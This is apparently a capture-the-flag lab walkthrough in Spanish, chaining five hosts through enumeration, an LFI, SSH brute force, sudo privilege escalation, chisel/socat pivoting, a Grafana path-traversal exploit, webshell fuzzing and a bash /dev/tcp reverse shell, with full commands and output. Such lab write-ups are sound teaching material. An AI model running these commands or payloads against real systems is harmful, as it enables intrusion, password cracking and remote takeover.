@@ -1,0 +1,804 @@
+# Interfaces de Redes
+
+hostname -I
+192.168.100.144 172.17.0.1 10.10.10.1 
+
+en la red 192... y 172... no hay nada, por lo que continuare con la red 10.10.10.1
+
+# Reconocimento de Hosts en red 10.10.10.1
+
+nmap -sn 10.10.10.1/24
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-10-12 22:26 -03
+Nmap scan report for 10.10.10.2
+Host is up (0.000072s latency).
+MAC Address: 02:42:0A:0A:0A:02 (Unknown)
+Nmap scan report for 10.10.10.1
+Host is up.
+Nmap done: 256 IP addresses (2 hosts up) scanned in 2.06 seconds
+
+host activo: 10.10.10.2
+
+# Escaneo de Puertos, Versiones y Servicios en Host 10.10.10.2
+
+map -Pn -n -sS -p- -sCV --min-rate 5000 -vvv 10.10.10.2 -oN nmap
+
+Nmap scan report for 10.10.10.2
+Host is up, received arp-response (0.0000050s latency).
+Scanned at 2024-10-12 22:28:16 -03 for 8s
+Not shown: 65533 closed tcp ports (reset)
+PORT   STATE SERVICE REASON         VERSION
+22/tcp open  ssh     syn-ack ttl 64 OpenSSH 9.2p1 Debian 2+deb12u2 (protocol 2.0)
+| ssh-hostkey: 
+|   256 03:cf:72:54:de:54:ae:cd:2a:16:58:6b:8a:f5:52:dc (ECDSA)
+| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBFBns4ZccIGmiw02cgCwENA1Lqhf7o9eDomefNVF1iF0Yxx+9JEB6f1kEHCjHqd7fBtn6mnlgPdE+VfqBGVhc2U=
+|   256 13:bb:c2:12:f5:97:30:a1:49:c7:f9:d0:ba:d0:5e:f7 (ED25519)
+|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIIr1k5/j/3yvWf8rLays4s/EPgkqySLYjRHL6QAq2yN8
+80/tcp open  http    syn-ack ttl 64 Apache httpd 2.4.57 ((Debian))
+| http-methods: 
+|_  Supported Methods: HEAD GET POST OPTIONS
+|_http-title: Apache2 Debian Default Page: It works
+|_http-server-header: Apache/2.4.57 (Debian)
+MAC Address: 02:42:0A:0A:0A:02 (Unknown)
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+servicio ssh OpenSSH 9.2p1 y servicio web http Apache httpd 2.4.57 ((Debian))
+
+comienzo por el servicio web, que al conectarme por el navegador a la ip, no se conecta pero refleja el dominio: http://grandma.dl/
+por lo que lo agregare al archivo /etc/hosts
+
+=================================================
+echo '10.10.10.2      grandma.dl' >> /etc/hosts
+=================================================
+
+procedo ahora a conectarme nuevamente por el navegador y me consigo con la plantilla de apache por defecto...
+por lo que tocara realizar fuzzing web
+
+# Fuzzing Web en host 10.10.10.2 > http://grandma.dl/
+
+feroxbuster -u http://grandma.dl -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt -x txt,php,bak,db,py,html,js,jpg,png
+ ___  ___  __   __     __      __         __   ___
+|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
+|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
+by Ben "epi" Risher 🤓                 ver: 2.11.0
+───────────────────────────┬──────────────────────
+ 🎯  Target Url            │ http://grandma.dl
+ 🚀  Threads               │ 50
+ 📖  Wordlist              │ /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt
+ 👌  Status Codes          │ All Status Codes!
+ 💥  Timeout (secs)        │ 7
+ 🦡  User-Agent            │ feroxbuster/2.11.0
+ 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
+ 🔎  Extract Links         │ true
+ 💲  Extensions            │ [txt, php, bak, db, py, html, js, jpg, png]
+ 🏁  HTTP methods          │ [GET]
+ 🔃  Recursion Depth       │ 4
+───────────────────────────┴──────────────────────
+ 🏁  Press [ENTER] to use the Scan Management Menu™
+──────────────────────────────────────────────────
+403      GET        9l       28w      275c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
+404      GET        9l       31w      272c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
+200      GET       24l      127w    10359c http://grandma.dl/icons/openlogo-75.png
+200      GET      368l      933w    10701c http://grandma.dl/
+200      GET      368l      933w    10701c http://grandma.dl/index.html
+301      GET        9l       28w      307c http://grandma.dl/shop => http://grandma.dl/shop/
+200      GET     1116l     6033w   478553c http://grandma.dl/shop/keyboard.jpg
+200      GET       44l       90w     1112c http://grandma.dl/shop/index.php
+[####################] - 2m   4152660/4152660 0s      found:6       errors:0      
+[####################] - 2m   2076290/2076290 21451/s http://grandma.dl/ 
+[####################] - 2m   2076290/2076290 21207/s http://grandma.dl/shop/
+
+al chequear en http://grandma.dl/shop/ a pie de pagina puedo observar:
+
+ "Error de Sistema: ($_GET['archivo']"); 
+
+al observar esto y ver que el reporte de feroxbuster reporta un .php >> http://grandma.dl/shop/index.php
+
+procedo a probar si existe una vulnerabilidad LFI de la siguiente manera:
+
+curl "http://grandma.dl/shop/index.php?archivo=../../../../../../etc/passwd" 2>&1 |grep bash
+
+        <pre>root:x:0:0:root:/root:/bin/bash
+seller:x:1000:1000:seller,,,:/home/seller:/bin/bash
+manchi:x:1001:1001:manchi,,,:/home/manchi:/bin/bash
+
+si es vulnerable a un FLI, ya tenemos los usuarios del sistema:
+root - seller - manchi
+
+ahora como vimos en el reporte de nmap, el servicio ssh esta activo, por lo que procedere a realizar un ataque de
+diccionario contra los user manchi y seller
+
+hydra -l seller -P /home/darks/Desktop/linux/Kali/diccionarios/rockyou.txt ssh://10.10.10.2
+nada con el user seller
+
+hydra -l manchi -P /home/darks/Desktop/linux/Kali/diccionarios/rockyou.txt ssh://10.10.10.2
+[22][ssh] host: 10.10.10.2   login: manchi   password: lovely
+
+# Intrusion al Host 10.10.10.2 >> ssh
+
+ssh manchi@10.10.10.2
+pass:lovely
+
+find / -perm -4000 2>/dev/null
+/usr/lib/openssh/ssh-keysign
+/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+/usr/bin/mount
+/usr/bin/su
+/usr/bin/chsh
+/usr/bin/umount
+/usr/bin/gpasswd
+/usr/bin/chfn
+/usr/bin/passwd
+/usr/bin/newgrp
+/usr/bin/sudo
+
+sudo /bin/bash
+manchi is not in the sudoers file.
+
+por aqui no podemos realizar la escalada, ya revise el sistema pero no consigo forma de escalar por 
+lo que intentare conseguir la password del user seller con un ataque de diccionario contra ese user
+por lo que enviare un script en bash que tengo y un diccionario a la maquina 10.10.10.2
+
+scp Linux-Su-Force.sh manchi@10.10.10.2:/home/manchi
+scp rockyou.txt manchi@10.10.10.2:/home/manchi
+
+ahora desde el user manchi aplico el ataque contra el user seller de la siguiente manera:
+
+./Linux-Su-Force.sh seller rockyou.txt
+Contraseña encontrada para el usuario seller: qwerty
+
+su seller
+pass:qwerty
+
+>> ahora soy el user seller
+
+sudo -l 
+User seller may run the following commands on 42354deb1a9f:
+    (ALL) NOPASSWD: /usr/bin/php
+
+sudo /usr/bin/php -r "system('chmod u+s /bin/bash');"
+ls -la /bin/bash
+-rwsr-xr-x 1 root root 1265648 Apr 23  2023 /bin/bash
+/bin/bash -p
+whoami
+#root
+
+hostname -I
+10.10.10.2 20.20.20.2 
+
+aqui veo que esta maquina tiene acceso a otra red >> 20.20.20.2
+
+=======================================================================
+ping -c 1 10.10.10.1
+PING 10.10.10.1 (10.10.10.1) 56(84) bytes of data.
+64 bytes from 10.10.10.1: icmp_seq=1 ttl=64 time=0.150 ms
+
+--- 10.10.10.1 ping statistics ---
+1 packets transmitted, 1 received, 0% packet loss, time 0ms
+rtt min/avg/max/mdev = 0.150/0.150/0.150/0.000 ms
+=======================================================================
+
+como esta maquina puede realizar ping, enviare desde mi maquina atacante 
+un script en bash para detectar hosts activos en la red 20.20.20.1/24
+
+scp scanip.sh manchi@10.10.10.2:/home/manchi
+========================================================================
+
+cp /home/manchi/scanip.sh .
+chmod +x scanip.sh
+./scanip.sh 20.20.20.1
+
+[+] La dirección IP es válida. Procediendo con el escaneo...
+
+[+] Host 20.20.20.3 - ACTIVO
+[+] Host 20.20.20.2 - ACTIVO
+
+el host activo es: 20.20.20.3 ya que .2 es la maquina actualmente vulnerada...
+ya conociendo el host activo en la red 20.20.20.1/24 procedo a crear un tunel 
+con chisel para redireccionar todo el trafico a mi maquina atacante y asi
+poder alcanzar dicha red desde mi maquina...
+
+1) envio el binario de chisel desde mi maquina atacante a la maquina 10.10.10.2
+
+scp chisel manchi@10.10.10.2:/home/manchi
+
+2) ejecuto chisel server en mi maquina atacante
+
+chisel server --reverse -p 90
+
+3) ejecuto chisel cliente en el host 10.10.10.2
+
+./chisel client 10.10.10.1:90 R:9000:socks &
+
+4) configuracion de proxychains4
+
+ya creado el tunel con chisel, procedo a configurar proxychains4 de la siguiente manera:
+
+>>> nano /etc/proxychains4.conf
+
+dynamic_chain		lo descomentamos
+strict_chain		lo comentamos
+
+agregamos a la lista de proxy's (al final del todo)
+el tunel que se creo con chisel...
+
+socks5  127.0.0.1 9000
+
+guardamos los cambios y cerramos...
+
+
+5) procedo a escanear el host que se encuentra activo en la red 20.20.20.1/24
+
+proxychains4 nmap -sT -Pn -n -vvv --min-rate 5000 20.20.20.3 2>/dev/null
+
+Nmap scan report for 20.20.20.3
+Host is up, received user-set (0.00071s latency).
+Scanned at 2024-10-12 23:38:32 -03 for 1s
+Not shown: 996 closed tcp ports (conn-refused)
+PORT     STATE SERVICE REASON
+21/tcp   open  ftp     syn-ack
+22/tcp   open  ssh     syn-ack
+80/tcp   open  http    syn-ack
+3000/tcp open  ppp     syn-ack
+
+para poder observar el servicio web levantado en el host 20.20.20.3
+abro firefox con proxychains y me conecto a la ip 20.20.20.3
+
+proxychains4 firefox
+
+al chequear el servicio web, me consigo con la plantilla de apache por defecto, pero si reviso el puerto 3000
+me consigo con el panel de login de grafana, el cual tiene una version: 8.3.0
+
+esta version de Grafana es vulnerable {CVE-2021-43798}, consigo un exploit con searchsploit el cual ejecuto 
+a traves del proxychains4 de la siguiente manera:
+
+proxychains4 python3 Grafana-8.3.0.py -H http://20.20.20.3:3000
+[proxychains] config file found: /etc/proxychains4.conf
+[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
+[proxychains] DLL init: proxychains-ng 4.17
+Read file > /etc/passwd
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
+_apt:x:42:65534::/nonexistent:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+systemd-network:x:998:998:systemd Network Management:/:/usr/sbin/nologin
+systemd-timesync:x:997:997:systemd Time Synchronization:/:/usr/sbin/nologin
+messagebus:x:100:101::/nonexistent:/usr/sbin/nologin
+ftp:x:101:104:ftp daemon,,,:/srv/ftp:/usr/sbin/nologin
+sshd:x:102:65534::/run/sshd:/usr/sbin/nologin
+grafana:x:103:105::/usr/share/grafana:/bin/false
+freddy:x:1000:1000::/home/freddy:/bin/bash
+
+tengo el user del sistema: freddy
+>> ataque contra ssh no dio resultados...
+
+paso al servicio ftp
+
+proxychains4 ftp 20.20.20.3
+name: anonymous
+pass: en blanco
+ls
+drwxrwxrwx    1 0        0            4096 Mar 29  2024 mantenimiento
+cd mantenimiento
+ls
+-rwxrwxrwx    1 0        0            2021 Mar 29  2024 database.kdbx
+get database.kdbx
+
+me descargo la db, intento extraer el hash con john pero me indica:
+! database.kdbx : File version '40000' is currently not supported!
+
+por lo que continuare con fuzzing web:
+
+gobuster --proxy socks5://127.0.0.1:9000 dir -u http://20.20.20.3 -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt -x php,txt,html,py,db,js,png,jpg -t 200 -b 404
+
+===============================================================
+Starting gobuster in directory enumeration mode
+===============================================================
+/.php                 (Status: 403) [Size: 275]
+/.html                (Status: 403) [Size: 275]
+/index.html           (Status: 200) [Size: 10701]
+/maintenance.html     (Status: 200) [Size: 63]
+/.html                (Status: 403) [Size: 275]
+/.php                 (Status: 403) [Size: 275]
+/server-status        (Status: 403) [Size: 275]
+Progress: 1868787 / 1868796 (100.00%)
+===============================================================
+
+al chequear a traves del navegador en http://20.20.20.3/maintenance.html consigo el siguiente mensaje:
+
+Website under maintenance, access is in /tmp/pass.txt
+
+asi que vuelvo ejecutar el script para Grafana y asi poder leer el archivo /tmp/pass.txt,
+una vez ejecutado y leido el archivo, obtengo: t9sH76gpQ82UFeZ3GXZS
+lo que me parece una password, por lo que procedo a probarla contra el user freddy en el 
+servicio ssh
+
+proxychains4 ssh freddy@20.20.20.3 2>/dev/null
+pass: t9sH76gpQ82UFeZ3GXZS
+
+y logro el acceso
+
+# Acesso en 20.20.20.3 como el User freddy
+
+sudo -l
+
+User freddy may run the following commands on 12b510135d40:
+    (ALL) NOPASSWD: /usr/bin/python3 /opt/maintenance.py
+
+ls -la /opt/maintenance.py
+-rw-r--r-- 1 freddy freddy 35 Mar 29  2024 /opt/maintenance.py
+
+como soy el user freddy podre modificar el script .py
+
+echo 'import subprocess; subprocess.run("chmod u+s /bin/bash", shell=True)' > /opt/maintenance.py
+sudo /usr/bin/python3 /opt/maintenance.py
+ls -la /bin/bash
+-rwsr-xr-x 1 root root 1277936 Nov 26  2023 /bin/bash
+
+/bin/bash -p
+whoami
+root
+
+hostname -I
+20.20.20.3 30.30.30.2
+
+observo que esta maquina (20.20.20.3) tambien tiene acceso a una red mas >> 30.30.30.1/24
+asi que voy a redireccionar el trafico de este host a mi maquina atacante creando un tunel 
+con socat y chisel.
+
+1) envio socat al host 10.10.10.2 y chisel al host 20.20.20.3
+
+scp socat manchi@10.10.10.2:/home/manchi
+proxychains4 scp chisel freddy@20.20.20.3:/home/freddy
+
+2) ejecuto socat en el host 10.10.10.2
+
+./socat tcp-l:3000,fork,reuseaddr tcp:10.10.10.1:90 &
+
+la conexion la recibe socat por el puerto 3000 y lo redirige a mi maquina atacante al
+puerto 90 donde esta el server chisel corriendo
+
+
+3) ejecuto chisel en el host 20.20.20.3
+
+./chisel client 20.20.20.2:3000 R:9001:socks &
+
+4) configuracion de proxychains4
+
+ahora desde mi maquina atacante agrego el nuevo tunel proxy que se creo, el
+cual podemos verlo desde el server chisel
+
+2024/10/13 10:36:54 server: session#2: tun: proxy#R:127.0.0.1:9001=>socks: Listening
+
+sudo nano /etc/proxychains4.conf
+
+[List-Proxy]
+
+socks5  127.0.0.1 9001
+socks5  127.0.0.1 9000
+
+Ctrl+o
+Crtl+x
+
+ya configurado el proxychains4, procedo a escanear la red 30.30.30.1/24
+
+proxychains4 nmap -sT -Pn -n -vvv --min-rate 5000 30.30.30.1 2>/dev/null
+sin respuesta
+
+proxychains4 nmap -sT -Pn -n -vvv --min-rate 5000 30.30.30.3 2>/dev/null
+Nmap scan report for 30.30.30.3
+Host is up, received user-set (0.100s latency).
+Scanned at 2024-10-13 10:48:37 -03 for 98s
+Not shown: 998 closed tcp ports (conn-refused)
+PORT   STATE SERVICE REASON
+22/tcp open  ssh     syn-ack
+80/tcp open  http    syn-ack
+
+para conectarme al puerto 80 por el navegador, primero reiniciamos la conexion >>> proxychains4 firefox
+solo lo cancelo y vuelvo ejecutar, una vez vuelto a iniciar me conecto al puerto 80 del host 30.30.30.3
+y me consigo con la plantilla por defecto de apache, asi que aplicare Fuzzing web
+
+gobuster --proxy socks5://127.0.0.1:9001 dir -u http://30.30.30.3 -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt -x php,txt,html,py,db,js,png,jpg -t 200 -b 404
+
+===============================================================
+Starting gobuster in directory enumeration mode
+===============================================================
+/.html                (Status: 403) [Size: 275]
+/.php                 (Status: 403) [Size: 275]
+/index.html           (Status: 200) [Size: 10701]
+/secret.php           (Status: 200) [Size: 927]
+/.html                (Status: 403) [Size: 275]
+/.php                 (Status: 403) [Size: 275]
+/server-status        (Status: 403) [Size: 275]
+Progress: 1868787 / 1868796 (100.00%)
+===============================================================
+
+en http://30.30.30.3/secret.php me consigo con el siguiente mensaje:
+----------------------------------
+Hola Mario,
+
+Esta web no se puede hackear.
+----------------------------------
+
+mario podria terminar siendo un user, asi que lo probare contra el servicio ssh
+
+proxychains4 hydra -l mario -P /home/darks/Desktop/linux/Kali/diccionarios/rockyou.txt ssh://30.30.30.3 2>/dev/null
+[22][ssh] host: 30.30.30.3   login: mario   password: chocolate
+
+ahora me conecto via ssh al host 30.30.30.3
+
+proxychains4 ssh mario@30.30.30.3
+pass:chocolate
+
+# Acceso al host 30.30.30.3 como el User mario
+
+sudo -l
+User mario may run the following commands on 021fb561c6e6:
+    (ALL) /usr/bin/vim
+
+sudo /usr/bin/vim -c ':!chmod u+s /bin/bash'
+salimos y validamos el binario /bin/bash
+
+ls -la /bin/bash
+-rwsr-xr-x 1 root root 1265648 Apr 23  2023 /bin/bash
+
+/bin/bash -p
+whoami
+root
+hostname -I
+30.30.30.3 40.40.40.2 
+
+este host tambien tiene acceso a una red mas >>> 40.40.40.1/24
+---------------------------------------------------------------------------------------------------------------------------------------
+
+hasta este punto, el mapa de conexion seria asi:
+
+
+  Maquina Atac.			10.10.10.2 20.20.20.2			20.20.20.3 30.30.30.2              30.30.30.3 40.40.40.2
+chisel server P90		   chisel client		             chisel client
+					socat					  
+---------------------------------------------------------------------------------------------------------------------------------------
+
+para descubrir hosts activos en la red 40.40... enviare desde mi maquina atcante un script en bash para esta tarea
+
+proxychains4 scp scanip.sh mario@30.30.30.3:/home/mario
+pass: chocolate
+
+ya transferido, procedo a escanear desde el host 30.30.30.3
+
+./scanip.sh 40.40.40.1
+
+[+] La dirección IP es válida. Procediendo con el escaneo...
+
+[+] Host 40.40.40.2 - ACTIVO
+[+] Host 40.40.40.3 - ACTIVO
+
+1)
+ya que conozco el host activo en esa red, enviare chisel al host 30.30.30.3 y socat al host 20.20.20.3
+
+proxychains4 scp chisel mario@30.30.30.3:/home/mario
+pass:chocolate
+
+proxychains4 scp socat freddy@20.20.20.3:/home/freddy
+pass:t9sH76gpQ82UFeZ3GXZS
+
+
+2)
+
+en 10.10.10.2: socat
+estara en escucha por el puerto 3001 y reenviara al server chisel
+de mi maquina atacante
+
+./socat tcp-l:3001,fork,reuseaddr tcp:10.10.10.1:90 &
+
+
+en 20.20.20.3: socat
+estara en escucha por el puerto 3002 y reenviara la conexion 
+a socat en el host 20.20.20.2:3001
+
+./socat tcp-l:3002,fork,reuseaddr tcp:20.20.20.2:3001 &
+
+
+en 30.30.30.3: chisel
+la conexion se enviara a socat en el host 30.30.30.2:3002
+
+./chisel client 30.30.30.2:3002 R:9002:socks &
+
+ya en este punto se a creado un nuevo tunel en el server de chisel
+
+2024/10/13 11:41:28 server: session#3: tun: proxy#R:127.0.0.1:9002=>socks: Listening
+
+
+este tunel lo agrego al archivo de configuracion /etc/proxychains4.conf
+y como sabemos que el host activo es el 40.40.40.3, procedo realizando un
+escaneo directamente
+
+
+proxychains4 nmap -sT -Pn -n -vvv --min-rate 5000 40.40.40.3 2>/dev/null
+
+Nmap scan report for 40.40.40.3
+Host is up, received user-set (0.096s latency).
+Scanned at 2024-10-13 11:48:33 -03 for 98s
+Not shown: 999 closed tcp ports (conn-refused)
+PORT   STATE SERVICE REASON
+80/tcp open  http    syn-ack
+
+
+como en el caso anterior, cancelo la conexion proxychains4 firefox y la vuelvo a levantar, esto para
+que comeince a pasar por el ultimo tunel que agregamos y tener visibilidad desde el navegador
+
+ahora al chequear el puerto 80 del host 40.40.40.3 en el navegador, veo que puedo cargar archivos,
+asi que primero realizare fuzzing web
+
+gobuster --proxy socks5://127.0.0.1:9002 dir -u http://40.40.40.3 -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt -x php,txt,html,py,db,js,png,jpg -t 200 -b 404
+
+===============================================================
+Starting gobuster in directory enumeration mode
+===============================================================
+/.html                (Status: 403) [Size: 275]
+/uploads              (Status: 301) [Size: 310] [--> http://40.40.40.3/uploads/]
+/.php                 (Status: 403) [Size: 275]
+/index.html           (Status: 200) [Size: 1361]
+/upload.php           (Status: 200) [Size: 1357]
+/.html                (Status: 403) [Size: 275]
+/.php                 (Status: 403) [Size: 275]
+/server-status        (Status: 403) [Size: 275]
+Progress: 1868787 / 1868796 (100.00%)
+===============================================================
+Finished
+===============================================================
+
+por un lado vemos que interpreta php y por otro el directorio donde se cargan los archivos
+por lo que creare un php malicioso con una revershell para poder ganar acceso a la maquina
+pero antes debemos ejecutar nuevamente socat en todas las maquina hasta ahora vulneradas
+para hacer llegar la revershell a mi maquina atacante...
+
+
+1) enviar socat al host 30.30.30.3
+
+proxychains4 scp socat mario@30.30.30.3:/home/mario
+pass:chocolate
+
+2) me coloco en escucha en mi maquina atacante con netcat
+
+nc -lnvp 4444
+
+
+3) ejecuto socat en el host 10.10.10.2
+
+aqui estare esperando una conexion por el puerto 4000 con socat
+para reenviar a netcat en mi  maquina atacante
+
+./socat tcp-l:4000,fork,reuseaddr tcp:10.10.10.1:4444 &
+
+
+4) ejecuto socat en el host 20.20.20.3
+
+la conexion se estara esperando por el puerto 4001 con socat y sera reenviada
+al host 20.20.20.2 al puerto 4000 de socat
+
+./socat tcp-l:4001,fork,reuseaddr tcp:20.20.20.2:4000 &
+
+
+5) ejecuto socat en el host 30.30.30.3
+
+la conexion se espera por el puerto 4002 y se reenvia al host 30.30.30.2
+por el puerto 4001 de socat
+
+./socat tcp-l:4002,fork,reuseaddr tcp:30.30.30.2:4001 &
+
+
+6) la revershell desde host 40.40.40.3
+
+el php malicioso que genere la revershell debe enviar la conexion al host 40.40.40.2
+por el puerto 4002, una vez configurada la revershell, la cargamos y buscamos el .php
+cargado en http://40.40.40.3/uploads/ y si todo a sido configurado correctamente, al 
+llamar al php malicioso debemos recibir la conexion por netcat en nuestra maquina atacante...
+
+al chequear netcat, he recibido la conexion como el user www-data
+
+
+# Acceso al host 40.40.40.3 como el User www-data
+
+script /dev/null -c bash 
+stty raw -echo; fg
+reset xterm
+stty rows 38 columns 168
+export TERM=xterm
+export SHELL=bash
+sudo -l
+
+User www-data may run the following commands on 4299389204e3:
+    (root) NOPASSWD: /usr/bin/env
+
+sudo /usr/bin/env /bin/bash
+root
+hostname -I
+40.40.40.3 50.50.50.2 
+
+este host tiene acceso a una red mas >>> 50.50.50.1/24
+
+no tiene instalado el comando ping y parece que tampoco tiene conexion a internet
+asi que una vez mas, creare un tunel para llegar a la red 50... desde mi maquina
+atacante
+
+1) cargar chisel en el host 40.40.40.3
+
+como esta maquina no tiene ssh no podre enviar chisel como lo hice anteriormente,
+pero el host 40.40.40.2 ya tiene el binario de chisel y como en el host 40.40.40.3
+tiene curl instalado, lo que hare sera conectarme en una nueva instancia al host 
+40.40.40.2 y levantar un server python y asi desscargar desde el host 40.40.40.3
+mediante curl el binario chisel...
+
+proxychains4 ssh mario@30.30.30.3
+pass:chocolate
+/bin/bash -p
+python3 -m http.server 2500
+
+ahora desde el host 40.40.40.3 nos descargamos chisel
+
+curl -O http://40.40.40.2:2500/chisel
+
+
+2) ejecucion de socat en los host ya vulnerados
+
+host: 10.10.10.2
+./socat tcp-l:3500,fork,reuseaddr tcp:10.10.10.1:90 &
+
+
+host: 20.20.20.3
+./socat tcp-l:3501,fork,reuseaddr tcp:20.20.20.2:3500 &
+
+host: 30.30.30.3
+./socat tcp-l:3502,fork,reuseaddr tcp:30.30.30.2:3501 &
+
+
+por ultimo desde el host 40.40.40.3 ejecutamos chisel
+chmod +x chisel
+./chisel client 40.40.40.2:3502 R:9003:socks &
+
+
+ahora al chequear el server chisel vemos que se creo el nuevo tunel
+2024/10/13 13:52:46 server: session#4: tun: proxy#R:127.0.0.1:9003=>socks: Listening
+
+el cual agregare al archivo /etc/proxychains4.conf, ahora ire chequeando los hosts que den
+respuesta dentro de la red 50.50.50.1/24
+
+proxychains4 nmap -sT -Pn -n -vvv --min-rate 3000 50.50.50.1 2>/dev/null
+sin respuesta
+
+proxychains4 nmap -sT -Pn -n -vvv --min-rate 3000 50.50.50.3 2>/dev/null
+Nmap scan report for 50.50.50.3
+Host is up, received user-set (0.11s latency).
+Scanned at 2024-10-13 14:00:01 -03 for 102s
+Not shown: 998 closed tcp ports (conn-refused)
+PORT   STATE SERVICE REASON
+22/tcp open  ssh     syn-ack
+80/tcp open  http    syn-ack
+
+para chequear el servicio web se repite el mismo procedimiento, paramos el proceso proxychains4 firefox y
+lo volvemos a levantar, al revisar el servicio web, al final del todo consigo el siguiente texto:
+____________________________________________________________________________________________________________________________
+Contáctanos
+¡Contáctanos hoy mismo para más información sobre nuestros programas de enseñanza de inglés!. Guardo un secretito en /tmp ;)
+____________________________________________________________________________________________________________________________
+
+hago un poco de fuzzing web
+
+gobuster --proxy socks5://127.0.0.1:9003 dir -u http://50.50.50.3 -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt -x php,txt,html,py,db,js,png,jpg -t 200 -b 404
+
+===============================================================
+Starting gobuster in directory enumeration mode
+===============================================================
+/.php                 (Status: 403) [Size: 275]
+/.html                (Status: 403) [Size: 275]
+/index.html           (Status: 200) [Size: 2510]
+/shell.php            (Status: 500) [Size: 0]
+/warning.html         (Status: 200) [Size: 315]
+/.php                 (Status: 403) [Size: 275]
+/.html                (Status: 403) [Size: 275]
+/server-status        (Status: 403) [Size: 275]
+Progress: 1868787 / 1868796 (100.00%)
+===============================================================
+Finished
+===============================================================
+
+
+en http://50.50.50.3/warning.html conseguimos el siguiente mensaje:
+=================================================================================================
+Esta web ha sido atacada por otro hacker, pero su webshell tiene un parámetro que no recuerdo...
+=================================================================================================
+
+para buscar el parametro que nos de acceso a la shell, here uso de wfuzz
+
+wfuzz -p 127.0.0.1:9003:SOCKS5 -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt -u "http://50.50.50.3/shell.php?FUZZ=whoami" -t 200 --hh=0
+
+=====================================================================
+ID           Response   Lines    Word       Chars       Payload                                                                                                
+=====================================================================
+
+000108069:   200        1 L      1 W        12 Ch       "parameter"        
+
+
+ahora desde el navegador pruebo la ejecucion de comandos
+
+http://50.50.50.3/shell.php?parameter=whoami
+www-data
+
+tenemos ejecucion de comandos!!!!
+
+ahora creare un nuevo tunel que me permita obtener una revershell hasta el host 50.50.50.3
+
+1) Ejecucion de socat en todos los host's previamente vulnerados y me pongo en escucha por netcat
+en mi maquina atacante
+
+Maquina Atacante:
+nc -lnvp 4445
+
+host: 10.10.10.2
+./socat tcp-l:1111,fork,reuseaddr tcp:10.10.10.1:4445 &
+
+host: 20.20.20.3
+./socat tcp-l:2222,fork,reuseaddr tcp:20.20.20.2:1111 &
+
+host: 30.30.30.3
+./socat tcp-l:3333,fork,reuseaddr tcp:30.30.30.2:2222 &
+
+host: 40.40.40.3
+./socat tcp-l:4444,fork,reuseaddr tcp:40.40.40.2:3333 &
+
+
+2) envio de la revershell
+
+la revershell debe apuntar a la ip 50.50.50.2 y al puerto 4444
+
+/bin/bash -i >& /dev/tcp/40.40.40.3/4444 0>&1
+
+pero esto se debe url-encodear y para esto usare burpsuite, el resultado seria:
+
+http://50.50.50.3/shell.php?parameter=%62%61%73%68%20%2d%63%20%22%2f%62%69%6e%2f%62%61%73%68%20%2d%69%20%3e%26%20%2f%64%65%76%2f%74%63%70%2f%35%30%2e%35%30%2e%35%30%2e%32%2f%34%34%34%34%20%30%3e%26%31%22
+
+ahora si revisamos netcat, hemos recibido la conexion y hemos accedido al host 50.50.50.3
+
+# Acceso al host 50.50.50.3 como el User www-data
+
+script /dev/null -c bash 
+stty raw -echo; fg
+reset xterm
+stty rows 38 columns 168
+export TERM=xterm
+export SHELL=bash
+
+nada por sudo -l y sin binarios de los cuales poder abusar y escalar...
+chequeando los directorios en el sistema, en /tmp consigo un archivo oculto
+
+ls -la /tmp
+-rw-r--r-- 1 root root   21 Apr 12  2024 .secret.txt
+cat /tmp/.secret.txt
+contraseñaderoot123
+su root
+pass:contraseñaderoot123
+root
+hostname -I
+50.50.50.3
+
+ya hemos alcanzado la ultima maquina, los host's vulnerados (a nivel root) fueron:
+
+host 1 = 10.10.10.2 - 20.20.20.2 
+host 2 = 20.20.20.3 - 30.30.30.2 
+host 3 = 30.30.30.3 - 40.40.40.2 
+host 4 = 40.40.40.3 - 50.50.50.2 
+host 5 = 50.50.50.3
